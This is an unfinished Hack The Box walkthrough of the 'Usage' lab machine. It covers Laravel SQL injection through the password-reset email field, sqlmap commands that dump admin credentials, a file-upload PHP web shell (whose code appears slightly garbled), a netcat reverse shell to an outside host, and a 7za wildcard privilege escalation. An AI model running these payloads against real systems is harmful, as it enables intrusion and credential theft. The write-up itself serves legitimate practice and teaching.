---
title: HTB-Usage
draft: false
tags:
  - htb
  - linux
  - easy
---
Picture here

## Information Gathering
### Rustscan

Rustscan discovers HTTP and SSH open:

```bash
┌──(yoon㉿kali)-[~/Downloads]
└─$ rustscan --addresses 10.10.11.18 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢
<snip>
Host is up, received syn-ack (0.31s latency).
Scanned at 2024-05-17 06:22:29 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.66 seconds
```


## Enumeration
### HTTP - TCP 80

After adding **usage.htb** to `/etc/hosts`, we can access the website:

pic here

**Admin** directs us to **admin.usage.htb**, which I also add to `/etc/hosts`:

![alt text](image.png)

**Reset Password** directs to `/forget-password`, and we can submit email address to reset password:

pic here

## Laravel SQLi

**Wappalyzer** shows that **Laravel** is running on the website:

wappalzyer ss

[Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/laravel) provides detailed guides on exploiting Laravel.

After reading through, it seems like we might be able to do SQL Injection attack. 

Testing all possible entry points, `/forget-password` email paramenter is found to be vulnerable.

Let's first intercept request for reset password using Burp Suite:

![alt text](image-3.png)

Using [this list](https://github.com/payloadbox/sql-injection-payload-list?tab=readme-ov-file#generic-error-based-payloads) for fuzzing the email paramenter, it seems that length of 7729 is a redirection page and length of 1616 is 500 error page:

![alt text](image-7.png)

### SQLi Detection

Let's try identifying the number of columns.

Submitting `a' ORDER BY 8;-- -` will direct us to redirection page:

![alt text](image-5.png)

Submitting `a' ORDER BY 9;-- -` shows Server Error, indicating there's 8 columns:

![alt text](image-6.png)


### SQLMap

Let's automate the exploitation using sqlmap and set the paramenter email to be vulnerbale:

`sqlmap -r forget-pass-req.txt -p email --dbs --batch`



Let's try again after setting the risk level as such:

`sqlmap -r forget-pass-req.txt -p email --batch --level 5 --risk 3 --dbs`


Scan is very slow, but it still identifies email parameter being vulnerable and discovers MySQL running in the background. 

`sqlmap -r req.txt -p email --batch --level 5 --risk 3 --dbms=mysql -D usage_blog --tables`

`sqlmap -r req.txt -p email --batch --level 5 --risk 3 --dbms=mysql -D usage_blog -T admin_users --dump`


`sqlmap -r req.txt -p email --batch --level 5 --risk 3 --dbms=mysql -D usage_blog -T admin_users --columns`



`sqlmap -r req.txt -p email --batch --level 5 --risk 3 --dbms=mysql -D usage_blog -T admin_users --dump`


## Shell as dash
### admin.usage.htb

Using the cracked password, we can successfully signin to the dashboard:

![alt text](image-1.png)

At the bottom right, Laravel version is shown: **1.8.17**

![alt text](image-11.png)

### File Upload

Googling for Larval 1.8.17 exploit, we come accross [File Upload Vulnerability](https://www.exploit-db.com/exploits/49112).



![alt text](image-13.png)



https://github.com/pentestmonkey/php-reverse-shell

![alt text](image-12.png)

http://admin.usage.htb/uploads/images/rev_shell.jpg.php?cmd=id

<?php system(?_REQUEST["cmd"]); ?>


![alt text](image-14.png)

![alt text](image-15.png)

# real

pown

![alt text](image-16.png)

http://admin.usage.htb/uploads/images/pown.jpg.php

![alt text](image-17.png)

www.revshells.com

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.29 1337 >/tmp/f

![alt text](image-18.png)

![alt text](image-19.png)

![alt text](image-20.png)

3nc0d3d_pa$$w0rd


![alt text](image-21.png)


`sudo ssh xander@usage.htb`

![alt text](image-22.png)

![alt text](image-23.png)

`strings /usr/bin/usage_management`

![alt text](image-24.png)

`/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *`

`/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql`

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks

![alt text](image-25.png)


![alt text](image-27.png)

![alt text](image-28.png)

![alt text](image-29.png)

`ssh -i id_rsa root@usage.htb`

![alt text](image-26.png)




## References
- https://github.com/payloadbox/sql-injection-payload-list?tab=readme-ov-file#generic-error-based-payloads
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/laravel
